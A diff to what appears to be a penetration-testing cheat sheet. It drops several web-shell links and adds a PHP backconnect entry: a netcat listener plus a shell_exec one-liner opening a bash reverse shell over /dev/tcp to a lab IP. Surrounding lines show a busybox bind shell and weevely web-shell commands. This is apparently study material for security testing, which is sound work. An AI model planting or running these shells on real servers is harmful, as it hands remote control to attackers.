@@ -824,14 +824,6 @@ Shells
 
       From busybox  `/bin/busybox telnetd -|/bin/sh -p9999`
 
--   Pen test monkey PHP reverse shell  
-    [http://pentestmonkey.net/tools/web-shells/php-reverse-shel](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)
-
--   php-findsock-shell - turns PHP port 80 into an interactive shell  
-    [http://pentestmonkey.net/tools/web-shells/php-findsock-shell](http://pentestmonkey.net/tools/web-shells/php-findsock-shell)
-
--   Perl Reverse Shell  
-    [http://pentestmonkey.net/tools/web-shells/perl-reverse-shell](http://pentestmonkey.net/tools/web-shells/perl-reverse-shell)
 
 -   PHP powered web browser Shell b374k with file upload etc.  
     [https://github.com/b374k/b374k](https://github.com/b374k/b374k)
@@ -1646,6 +1638,13 @@ Client, Web and Password Attacks
         password (s3cr3t)  
         weevely generate s3cr3t  
         weevely http://$ip/weevely.php s3cr3t
+        
+    -   php shell backconnect  
+        
+        start listener 
+        
+        `# nc -nlvp 3333`
+        `<?php echo shell_exec('/bin/bash -c "bash -i >& /dev/tcp/10.11.0.183/3333 0>&1"');?>`
 
     -   Java Signed Applet Attack
 
@@ -1655,11 +1654,6 @@ Client, Web and Password Attacks
 
         -   nikto -h $ip
 
-    -   Essential Iceweasel Add-ons  
-        Cookies Manager
-        https://addons.mozilla.org/en-US/firefox/addon/cookies-manager-plus/  
-        Tamper Data  
-        https://addons.mozilla.org/en-US/firefox/addon/tamper-data/
 
     -   Cross Site Scripting (XSS)  
         significant impacts, such as cookie stealing and authentication
